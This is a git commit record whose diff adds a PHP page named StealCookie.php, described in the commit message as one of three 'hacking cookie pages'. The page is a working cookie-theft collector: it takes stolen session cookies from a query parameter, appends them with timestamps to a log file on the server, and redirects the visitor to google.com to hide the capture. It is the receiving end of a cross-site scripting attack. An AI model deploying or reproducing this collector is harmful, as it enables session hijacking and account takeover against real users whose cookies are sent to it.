744c191fa008309f2e7a74abb9e6cd0e77ab35d5
AlanD <riemannzetazero@gmail.com>
2020-01-11 01:13:28 +0000

    Added three hacking cookie pages

---
+++ html/cookies/StealCookie.php
@@ -0,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Cookie thief</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+</head>
+<body >
+	Cookie thief
+	<?php
+		header ('Location:https://google.com');
+		$cookies = $_GET["c"];
+		//// DateTime-stamped filename
+		//$file = fopen((date("Y.md.hi.s.")).'/var/log/hack/cookies.txt', 'w');
+		// Append to file
+		$file = fopen('/var/log/hack/cookies.txt', 'a');
+		fwrite($file, (date("Y.md h:i:s "))."===================================\n");
+		fwrite($file, $cookies . "\n\n");
+	?>
+</body>
+</html>
